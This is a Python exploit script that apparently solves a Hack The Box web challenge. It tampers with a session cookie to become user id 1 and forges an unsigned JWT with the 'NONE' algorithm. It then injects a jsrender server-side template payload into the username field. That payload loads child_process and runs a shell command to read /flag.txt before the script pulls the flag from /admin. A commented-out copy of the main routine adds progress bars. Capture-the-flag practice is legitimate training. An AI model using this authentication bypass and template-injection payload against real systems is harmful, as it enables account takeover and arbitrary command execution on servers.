import requests, json, re
from base64 import b64encode,b64decode
from pwn import info, success, error
from tqdm import tqdm
import time

def register():
    data = json.dumps({"username" : "test", "password" : "test"})
    res = requests.post(target + "/register", headers=headers, data=data)
    info("Registering new user")

def jsrender_SSTI():
    payload = "{{:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()\")()}}"
    data = json.dumps({"username" : f"{payload}", "password" : "hope"})
    res = requests.post(target + "/register", headers=headers, data=data)
    info("Registering new user with jsrender SSTI payload at username field")
    info(f"Payload : {payload}")

def login_get_exp_cookie():
    data = json.dumps({"username" : "test", "password" : "test"})
    info("Login with the new user to get the cookies sample")
    res = requests.post(target + "/login", headers=headers, data=data)
    cookies_list = res.cookies['session'].split('.')
    # Cookies manipulation change id to 1
    info("Manipulating the cookies to change the id into 1")
    manipulation = b64decode(cookies_list[1]).decode()
    manipulation = manipulation[:6] + '1' + manipulation[6+1:]
    return manipulation

def encode(x):
    return b64encode(x).decode()

def generate_JWT():
    part1 = b'{"alg":"NONE","typ":"JWT"}'
    return encode(part1)[:-1] + '.' + encode(part2.encode()) + '.'

if __name__ == "__main__":

    host = input("Target IP:PORT : ")
    target = f"http://{host}"

    headers = {"Content-Type": "application/json"}

    register()
    part2 = login_get_exp_cookie()
    jwt = generate_JWT()
    success(f"Crafted JWT token{jwt}")
    cookies = {"session" : f"{jwt}"}
    jsrender_SSTI()

    reg_expression = r'HTB\{.*?\}'
    info("Visiting admin dashboard, Hopefully we got the flag")
    res = requests.get(target + "/admin", cookies=cookies)
    result = re.search(reg_expression, res.text)
    if result[0]:
        success(f"Flag : {result[0]}")
    else:
        error("Can't find the flag, Troubleshoot the jsrender payload")

# if __name__ == "__main__":
#     host = input("Target IP:PORT : ")
#     target = f"http://{host}"

#     headers = {"Content-Type": "application/json"}

#     # Define the width of the progress bar
#     bar_width = 50

#     # Create a separate progress bar for each step of your script
#     register_bar = tqdm(total=1, desc="Registering...", ncols=bar_width)
#     part2_bar = tqdm(total=1, desc="Running part 2...", ncols=bar_width)
#     jwt_bar = tqdm(total=1, desc="Generating JWT...", ncols=bar_width)
#     ssti_bar = tqdm(total=1, desc="Running JSRender SSTI...", ncols=bar_width)
#     flag_bar = tqdm(total=1, desc="Getting flag...", ncols=bar_width)

#     register()
#     register_bar.update(1)
#     time.sleep(1)

#     part2 = login_get_exp_cookie()
#     part2_bar.update(1)
#     time.sleep(1)

#     jwt = generate_JWT()
#     success(f"Crafted JWT token{jwt}")
#     jwt_bar.update(1)
#     time.sleep(1)

#     cookies = {"session" : f"{jwt}"}
#     jsrender_SSTI()
#     ssti_bar.update(1)
#     time.sleep(1)

#     reg_expression = r'HTB\{.*?\}'
#     info("Visiting admin dashboard, Hopefully we got the flag")
#     res = requests.get(target + "/admin", cookies=cookies)
#     result = re.search(reg_expression, res.text)
#     if result[0]:
#         success(f"Flag : {result[0]}")
#     else:
#         error("Can't find the flag, Troubleshoot the jsrender payload")
#     flag_bar.update(1)

#     # Close all progress bars
#     register_bar.close()
#     part2_bar.close()
#     jwt_bar.close()
#     ssti_bar.close()
#     flag_bar.close()